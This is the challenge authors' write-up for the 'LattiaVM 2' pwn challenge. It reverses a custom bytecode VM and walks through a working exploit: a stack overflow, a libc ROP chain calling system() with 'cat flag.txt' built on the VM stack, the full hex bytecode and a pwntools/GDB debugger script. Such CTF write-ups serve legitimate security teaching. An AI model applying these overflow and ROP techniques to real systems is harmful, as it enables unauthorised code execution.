# LattiaVM 2

### Authors: Lagoon, Shatterbox

- Category: Pwn
- Topics: reversing, custom stack-based VM bytecode programming, buffer overflow, ROP
- Est. Difficulty: Medium

## Description:

Good news: the VM received an update. The patch notes contain one item: longer programs. Go send the author a thank-you message.

# Handout

The challenge description implies that the program used for this exploit can be/has to be longer. The names of the files given to us are all the same, and the contents only have a few changes compared to VM 1.

For this reason, I'll only go over the changes.

# Entry Point: `wrapper.c`

Just twice as many hex chars. No other changes.

```c
#define MAX_HEX 513

int main(void)
{
    char buf[MAX_HEX + 1];

    puts("Welcome to LattiaVM!");

    printf("Input hex-encoded bytecode (no more than 512 hex chars):\n");
    fflush(stdout);

    // ...
}
```

# Executable's Main: `lattia-vm`/`main`

There are really only 3 changes:

- all the binary executable addresses have changed
  - doesn't matter too much, libc stayed the same and that's what matters
- it no longer checks the number of arguments
  - not that it ever mattered, we only interact with this binary through the wrapper which always gives one argument or segfaults if empty
- the bytecode went from 128 bytes max in VM1 to 256 in VM2
- it now malloc's the bytecode instead of storing as a global variable
  - this makes it impossible to use the PIE leak we found to read the `cat flag.txt\0` embedded in the bytecode

Decompiled code for reference:

```c
// NOTE 1: all the executable addresses have changed
004011a9    int32_t main(int32_t argc, char** argv, char** envp)

004011a9    {
004011a9        int32_t argc_1 = argc;
004011c1        void* fsbase;
004011c1        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
                // NOTE 2: no argument count check
004011e1        uint64_t inputStrLen = strlen(argv[1]);
004011e1
                // NOTE 3: input hex now accepts 512 characters,
                // which translates to 256 bytes of code.
004011f8        if (inputStrLen > 0x200)
004011f8        {
0040121a            puts("\x1b[0;31mInput too long.\x1b[0;37m");
0040120e            exit(1);
0040120e            /* no return */
004011f8        }
004011f8
0040121a        uint32_t bytecodeLen = (int32_t)(inputStrLen >> 1);
                // NOTE 4: bytecode is no longer stored in a global variable.
                // it is now stored in a separate memory allocation.
00401228        uint8_t* bytecode = malloc((int64_t)bytecodeLen);
00401256        decodeHexStr(argv[1], inputStrLen, bytecode);
00401265        puts("Executing...");
00401284        int32_t data[0x101];
00401284        runVM(&data, bytecode, (int64_t)bytecodeLen);
00401293        puts("Goodbye!");
004012a2        fflush(stdout);
004012b0        *(uint64_t*)((char*)fsbase + 0x28);
004012b0
004012b9        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
004012c1            return 0;
004012c1
004012bb        __stack_chk_fail();
004012bb        /* no return */
004011a9    }
```

There are no other relevant changes in the file. The VM's input handling and instruction set stayed the same.

Here is the full VM instruction set again for reference:

- All data is signed `int32_t`
- A is the element at the top of the stack
- B is the second item from the top
- Operations only pop as many elements as mentioned.

| Opcode | Mnemonic | Action                                         |
| :----- | :------- | ---------------------------------------------- |
| 00 xx  | PUSH xx  | push xx                                        |
| 01     | POP      | pop A                                          |
| 02     | ADD      | push A + B                                     |
| 03     | SUB      | push A - B                                     |
| 04     | MUL      | push A \* B                                    |
| 05     | DIV      | push B / A (note: ordering!)                   |
| 06 xx  | JMP xx   | goto xx                                        |
| 07 xx  | JNE xx   | if B != A: goto xx                             |
| 08 xx  | JE xx    | if B == A: goto xx                             |
| 09 xx  | JG xx    | if B > A: goto xx                              |
| 0a     | PRINT    | print A as decimal                             |
| 0b     | DUP      | pop A and push it twice (duplicate A)          |
| 0c xx  | SWAP xx  | swap A with the xx'th (e.g. 5th) item below it |
| 0d     | HALT     | end program                                    |

> While solving, I still recommend keeping this table on hand for quick reference.

# The Plan

It's almost exactly the same as VM1's solve, except now we can't use the PIE leak to read a command in our bytecode.

Remember, there were 2 places that we can put custom text:

- LattiaVM Program Bytecode
  - stored in a 256-byte malloc-ed address
  - location depends on where malloc puts it
  - can really only be found by leaking the variable that holds a pointer to it
- LattiaVM Stack Memory
  - stored in a local variable in main
  - location depends on the address of the stack

Let's see if we can find a pointer to the bytecode again:

# Debugging: Leaked Addresses

There are a bunch of ways to find out what we're about to find out.
The following way is the most convenient to explain.

The plan is to read `main`'s stack frame to find both the bytecode pointer and the location of the VM's stack data.
In VM1, I did this manually. Now that we have a debugger, we might as well use it.

We'll set up the debugger to `PUSH 0x42` so we can tell where the stack starts.
0x42 just happens to be unique enough to be identifiable.

Let's just repurpose our old debugger real quick:

| function | line of code     | VM1    | VM2    |
| -------- | ---------------- | ------ | ------ |
| main     | entry            | 0x1199 | 0x11a9 |
| runVM    | while (true)     | 0x1984 | 0x1967 |
| main     | puts("Goodbye!") | 0x1293 | 0x129f |

We'll also change the remote address from `lattia-vm-1.instances.ctf.l3ak.team` to `lattia-vm-2.instances.ctf.l3ak.team`

Should go without saying that we need to put this with a patched version of the new lattia-vm as well.

```py
"""
debug.py: LattiaVM 2 Debugger
place this file next to `lattia-vm-patched`

Usage:

# run locally
python3 debug.py
# run in docker
python3 debug.py DOCKER
# run on remote
python3 debug.py REMOTE

# debug, visualize step-by-step
python3 debug.py GDB
# debug, skip iterations until stack pointer hits 256
python3 debug.py GDB OVERFLOW
# debug, skip iterations until opcode 0x0d ("HALT") is hit
python3 debug.py GDB HALT
# debug, enable ASLR (works with or without OVERFLOW/HALT)
python3 debug.py GDB ASLR
"""

from pwn import *

# TODO: put more bytecode in here
bytecode = """
00 42
0a
0d
"""
bytecode = ''.join(bytecode.split())

print(bytecode)

skip_value = 2 if args.HALT else 1 if args.OVERFLOW else 0
gdbscript = f'set $SKIP = {skip_value}' + r"""
set gdb-workaround-stop-event enabled
set $codestr = *(char**)($rsp+0x10)
set $codeptr = "                                                                                                                                                                                                                                                              "
set $opcodes = "PUSH\0POP \0ADD \0SUB \0MUL \0DIV \0JMP \0JNE \0JE  \0JG  \0PRNT\0DUP \0SWAP\0HALT\0"
set $vmdbg = 0

brva 0x11a9
brva 0x1967
commands
    silent
    if !$vmdbg
        set context-sections ''
        set $vmdbg = 1
    end
    set $len = *(int*)($rbp-0x98)
    set $vmbc = *(char**)($rbp-0x90)
    set $vmstk = *(int**)($rbp-0x88)
    set $vmip = *(int*)($rbp-0x74)
    set $iters = *(int*)($rbp-0x70)

    set $vmsp = *(int*)($vmstk+0x100)
    set $vmop = *(char*)($vmbc+$vmip)
    set $opname = $opcodes+($vmop*5)
    set $vmnext = -1

    if $vmop==0x0 || $vmop==0x6 || $vmop==0x7 || $vmop==0x8 || $vmop==0x9 || $vmop==0xc
        set $vmnext = *(char*)($vmbc+$vmip+1) & 0xff
    end

    set $elements_skipped = ($vmsp-8)/16*16

    printf "ip: %d sp: %d, iters: %d, len: %d\n", $vmip, $vmsp, $iters, $len
    if ($SKIP==1 && $vmsp<256) || ($SKIP==2 && $vmop != 0x0d)
        continue
    end
    printf "bc: %s\n", $codestr
    printf "    %s^^", ($codeptr+254-($vmip*2))
    if $vmnext!=-1
        printf "^^"
    end
    printf " op: %s", $opname
    if $vmnext!=-1
        printf " 0x%x", $vmnext
    end
    printf "\n"

    printf "(%d elements skipped)\n", $elements_skipped
    x/32wx $vmstk+($elements_skipped)

    if $vmsp > 256
        printf "\n"
        telescope *(void**)$rbp
    end
end

brva 0x1293
commands
    set context-sections 'regs disasm code ghidra stack backtrace expressions threads heap_tracker'
end
"""

vuln = './lattia-vm-patched'
if args.GDB:
    io = gdb.debug(
        [vuln, bytecode],
        gdbscript=gdbscript,
        aslr=args.ASLR,
    )
elif args.DOCKER:
    io = remote('localhost', 5000)
    io.sendline(bytecode.encode())
elif args.REMOTE:
    io = remote('lattia-vm-2.instances.ctf.l3ak.team', 1337, ssl=True)
    io.sendline(bytecode.encode())
else:
    io = process([vuln, bytecode])

while True:
    line = io.recvline().decode()
    print(line, end='')
    try:
        n = int(line) & 0xffffffff
        print(f'= {n:0>8x}')
        print()
    except:
        pass
    if 'Goodbye!' in line:
        break

io.interactive()
```

Now we'll just do a quick debug check because we're lazy and don't want to do too much effort:

```sh
$ python3 debug.py GDB HALT
# continue until VM finishes and we're back in main
pwndbg> c
pwndbg> c
pwndbg> c
```

After `runVM()`'s execution, we're left with this stack in `main`:

```sh
─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd440 —▸ 0x7fffffffd988 —▸ 0x7fffffffdd7c ◂— './lattia-vm-patched'
01:0008│-428 0x7fffffffd448 ◂— 0x2f7fd234b
02:0010│-420 0x7fffffffd450 ◂— 8
03:0018│-418 0x7fffffffd458 —▸ 0x55555555c310 ◂— 0xd0a4200 # pointer to bytecode
04:0020│-410 0x7fffffffd460 ◂— 0x42 /* 'B' */ # VM stack
05:0028│-408 0x7fffffffd468 ◂— 0
... ↓        2 skipped
───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► 0   0x555555555293 None # address of the breakpoint at `puts("Goodbye!")`
   1   0x7ffff7df2f75 None
   2   0x7ffff7df3027 __libc_start_main+135
   3   0x5555555550e1 None
```

Great. The bytecode pointer appears _before_ the VM's Stack in memory.

Note again that all operations that use `pop()` can't bypass the lower bounds-check.
The SWAP command doesn't use `pop()`, but it also does its own bounds-checks.

We can't read that variable with the VM's bytecode.
At best you could try using a stack pointer leak to compute the address of the pointer to bytecode,
then finding a ROP gadget that just dereferences that pointer by one level,
but that's a lot of effort and I didn't do that.

Instead, we'll just switch to using the _other_ place we can put text: The VM Stack itself.

# The ROPchain

Remember, this was our stack after the stack overflow (bytecode for reference):

```py
bytecode = """
00 17
00 01 0c 01 03
    0b 0b 0b 0b
    0b 0b 0b 0b
    0b 0b 0b
0b 00 00 07 02
00 86 0b 02
0b 0b

0d
"""
```

```sh
$ python3 debug.py GDB HALT
pwndbg> c
pwndbg> c

# ...vn nemory omitted

# higher addresses go downwards
00:0000│+440 0x7fffffffd840 —▸ 0x7fffffffd958 —▸ 0x7fffffffdd48 ◂— './lattia-vm-patched' # stack address to rbp+558
01:0008│+448 0x7fffffffd848 —▸ 0x7ffff7df2f75 ◂— mov edi, eax
02:0010│+450 0x7fffffffd850 —▸ 0x7ffff7fc7000 ◂— 0x3010102464c457f
03:0018│+458 0x7fffffffd858 —▸ 0x5555555551a9 ◂— push rbp
04:0020│+460 0x7fffffffd860 ◂— 0x2ffffd940
05:0028│+468 0x7fffffffd868 —▸ 0x7fffffffd958 —▸ 0x7fffffffdd48 ◂— './lattia-vm-patched' # same stack address
06:0030│+470 0x7fffffffd870 ◂— 0
07:0038│+478 0x7fffffffd878 ◂— 0xc3fde1be0f68ef8b
```

Here's how that would look from the perspective of the VM:

```py
# higher addresses go upwards
# <top of stack>
   +460: 0x........
   +45c: 0x00005555 # address of main, we don't actually care about this one
   +458: 0x555551a9 # = piebase+0x11a9
   +454: 0x........
   +450: 0x........
   +44c: 0x00007fff # return address from main back to libc:
   +448: 0xf7df2f75 # = libc+0x29f75
   +444: 0x00007fff # a stack address
rbp+440: 0xffffd958 # = rbp+0x558
```

We could try to use the 2nd stack address right at the top of the stack, but i've already committed to using the one below, so I've opted to ignore it.

Our goal now is to have the same sort of ROP chain,
but this time instead of the address pointing to the bytecode,
it will now point to *above* the stack, where our command string will be:

```py
         # <top of stack>
   +474: 0x......00 # "\0"
   +470: 0x7478742e # ".txt"
   +46c: 0x67616c66 # "flag"
rbp+468: 0x20746163 # "cat " 
   +464: 0x00007fff # system()
   +460: 0xf7e1d790 # = libc+0x54790
   +45c: 0x00007fff # address of "cat flag.txt"
   +458: 0xffffdd98 # = piebase+0x40b3
   +454: 0x00007fff # pop rdi; ret;
   +450: 0xf7df39b7 # = libc+0x2a9b7
   +44c: 0x00007fff # ret;
   +448: 0xf7df39b8 # = libc+0x2a9b8
   +444: 0x........
rbp+440: 0x........
```

We'll make a couple modifications to the existing ROPchain builder:

```py
# start

# same as original ROPchain so far
# rbp+558, stk_hi, libc+29f75, libc_hi, _, _, _, _, _
SWAP 6
PUSH 51 DUP MUL PUSH 25
ADD
DUP PUSH 1 ADD
DUP
PUSH 20 PUSH 71 MUL PUSH 9 ADD PUSH 120 MUL
ADD
SWAP 2
SWAP 6 POP
SWAP 7
SWAP 6
DUP DUP
SWAP 6 POP
SWAP 7
# rbp+558, stk_hi, retgadget, libc_hi, poprdi, libc_hi, _, _, system, libc_hi, _

# deviate here
SWAP 9
# rbp+558, _, retgadget, libc_hi, poprdi, libc_hi, _, _, system, libc_hi, stk_hi
SWAP 3
# rbp+558, _, retgadget, libc_hi, poprdi, libc_hi, _, stk_hi, system, libc_hi, _
SWAP 10
# _, _, retgadget, libc_hi, poprdi, libc_hi, _, stk_hi, system, libc_hi, rbp+558

# rbp+0x558 - [240] = rbp+0x468 = catflag
PUSH 240
SWAP 1 SUB
# _, _, retgadget, libc_hi, poprdi, libc_hi, _, stk_hi, system, libc_hi, catflag
SWAP 4 POP
# _, _, retgadget, libc_hi, poprdi, libc_hi, catflag, stk_hi, system, libc_hi

# now to build the string. here's my algorithm:

# push 0x80*2 = 0x100
PUSH 0x80 DUP ADD

# ..., 0x100

DUP DUP DUP
    PUSH 0x20     # ' '
MUL PUSH 0x74 ADD # 't'
MUL PUSH 0x61 ADD # 'a'
MUL PUSH 0x63 ADD # 'c'
SWAP 1
# ..., "cat ", 0x100

DUP DUP DUP
    PUSH 0x67     # 'g'
MUL PUSH 0x61 ADD # 'a'
MUL PUSH 0x6c ADD # 'l'
MUL PUSH 0x66 ADD # 'f'
SWAP 1
# ..., "cat ", "flag", 0x100

DUP DUP DUP
    PUSH 0x74     # 't'
MUL PUSH 0x78 ADD # 'x'
MUL PUSH 0x74 ADD # 't'
MUL PUSH 0x2e ADD # '.'
# ..., "cat ", "flag", ".txt", 0x100

DUP SUB
# ..., "cat ", "flag", ".txt", "\0"

HALT
# _, _, retgadget, libc_hi, poprdi, libc_hi, catflag, stk_hi, system, libc_hi, "cat ", "flag", ".txt", "\0"
```

In bytecode:

```py
stack_overflow = """
00 17
00 01 0c 01 03
    0b 0b 0b 0b
    0b 0b 0b 0b
    0b 0b 0b
0b 00 00 07 02
00 86 0b 02
0b 0b
"""

build_rop = """
0c 06
00 33 0b 04 00 19 02
02
0b 00 01 02
0b
00 14 00 47 04 00 09 02 00 78 04
02
0c 02
0c 06 01
0c 07
0c 06
0b 0b
0c 06 01
0c 07

0c 09
0c 03
0c 0a
00 f0
0c 01 03
0c 04 01
"""
push_cmd = """
00 80 0b 02

0b 0b 0b
   00 20
04 00 74 02
04 00 61 02
04 00 63 02
0c 01

0b 0b 0b
   00 67
04 00 61 02
04 00 6c 02
04 00 66 02
0c 01

0b 0b 0b
   00 74
04 00 78 02
04 00 74 02
04 00 2e 02
0c 01

0b 03
"""
bytecode = stack_overflow + build_rop + push_cmd + '0d'
bytecode = ''.join(bytecode.split())
```

You can watch it build the string yourself with `python3 debug.py GDB OVERFLOW`, but I've already debugged it and am only showing the correct version, so... have at it:

```sh
$ python3 debug.py             
001700010c01030b0b0b0b0b0b0b0b0b0b0b0b0000070200860b020b0b0c0600330b04001902020b0001020b0014004704000902007804020c020c06010c070c060b0b0c06010c070c090c030c0a00f00c01030c040100800b020b0b0b00200400740204006102040063020c010b0b0b00670400610204006c02040066020c010b0b0b0074040078020400740204002e020c010b030d
[+] Starting local process './lattia-vm-patched': pid 739246
Executing...
Program finished. Took 481 iterations.
Goodbye!
[*] Switching to interactive mode
L3AK{t3st_fl4g}[*] Got EOF while reading in interactive
```

And of course, `python3 debug.py REMOTE` would have again given you:

# The Flag

```
L3AK{ty_f0r_50-47714-5-1000_2_m4ll0ctr1c_str1ng1f4l00}
```

> "Thank you for L-attia-V-M 2: malloctric stringifaloo"

LattiaVM 2: Electric Boogaloo. This time, you needed to deal with malloc by building a string on the stack yourself. Don't forget, we wanted to send thanks for longer programs.

# Unintended Solve for VM1
This same solution actually works for LattiaVM 1, with one caveat: the bytecode I used for the official solve is too long.

You don't need to encode the entirety of `cat flag.txt\0`. You really only need `cat f*` or even `cat *`. This saves around 35 or more bytes, while my current solve takes exactly 150 bytes. 150 - 35 is 115, which fits within the 128-byte limit for VM 1.

Other players had found out about this and solved both 1 and 2 using the exact same solver script, changing only the remote target. About 27% of VM 1 victors didn't solve VM 2 though (33 vs 24 solves), so that's probably a success in my book.

In hindsight, with just a tad bit more playtesting, I should've found this and patched it out in VM1. Maybe by having it clear the VM stack after it returns from the `runVM()` function. Or, I could've made VM 1 and 2 more distinct by making a direct nerf to VM 1: allowing `stdin`.

Welp, that didn't happen. Either way, I hope you had fun with the challenge.

- Shatterbox
